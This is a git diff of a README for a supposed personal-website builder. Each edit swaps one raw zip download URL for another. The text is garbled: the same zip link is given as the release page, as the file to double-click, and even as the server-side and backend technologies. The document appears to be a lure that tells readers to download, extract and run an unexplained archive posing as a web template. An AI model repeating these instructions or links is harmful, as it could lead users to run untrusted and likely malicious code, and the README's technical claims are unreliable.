@@ -1,6 +1,6 @@
 # 🌐 personal_portfolio - Build Your Personal Website Easily
 
-[![Download Now](https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip)
+[![Download Now](https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip)
 
 ## 🌟 Overview
 personal_portfolio is an easy-to-use application that helps you create and host your personal website. It offers modern styling and responsive design using popular web technologies. Showcase your work, skills, and experiences with a few simple steps.
@@ -10,7 +10,7 @@ To get started, you'll need to download the application files. Just follow the s
 
 ## 📥 Download & Install
 1. **Visit the Release Page:** Click on the link below to go to the releases page where you can download the software.
-   [Download Here](https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip)
+   [Download Here](https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip)
 
 2. **Choose the Latest Version:** Look for the latest version listed on the releases page. It usually has a title like "v1.0.0". 
 
@@ -18,7 +18,7 @@ To get started, you'll need to download the application files. Just follow the s
 
 4. **Extract the Files:** Once the download finishes, locate the file in your downloads folder. Right-click on the file and select 'Extract All' (Windows) or double-click the file (Mac) to unzip it.
 
-5. **Run the Application:** Open the extracted folder. Look for `https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip` and double-click it. This action will open your personal website in your default web browser.
+5. **Run the Application:** Open the extracted folder. Look for `https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip` and double-click it. This action will open your personal website in your default web browser.
 
 ## 🛠️ Features
 - **Responsive Design:** Your website will look great on all devices, including phones and tablets.
@@ -29,15 +29,15 @@ To get started, you'll need to download the application files. Just follow the s
 ## 📚 Technologies Used
 - **CSS** for styling
 - **JavaScript** for interactivity
-- **https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip** for server-side rendering
-- **https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip** for backend functionality
+- **https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip** for server-side rendering
+- **https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip** for backend functionality
 - **React** for a component-based user interface
 - **TypeScript** for type safety
 - **Tailwind CSS** for utility-first design
 
 ## 💻 System Requirements
 - A modern web browser (Chrome, Firefox, Safari)
-- No specific installation is required; just open the `https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip` file in your web browser.
+- No specific installation is required; just open the `https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip` file in your web browser.
 - Basic familiarity with navigating folders and files on your computer.
 
 ## 👩‍💻 Getting Help
@@ -53,10 +53,10 @@ Here are some planned features for future updates:
 - Options for integrating a blog or portfolio section.
 
 ## 🌐 Visit the Project
-For more detailed information and updates, you can always visit the project page: [personal_portfolio](https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip). 
+For more detailed information and updates, you can always visit the project page: [personal_portfolio](https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip). 
 
 ## 📥 Download Again
 If you need to download the application again, remember to visit the releases page one more time.
-[Download Here](https://raw.githubusercontent.com/Waqar1313/personal_portfolio/main/components/personal-portfolio-v1.8.zip)
+[Download Here](https://github.com/Waqar1313/personal_portfolio/raw/refs/heads/main/public/projects/personal-portfolio-1.0.zip)
 
 Enjoy building your personal website with personal_portfolio!
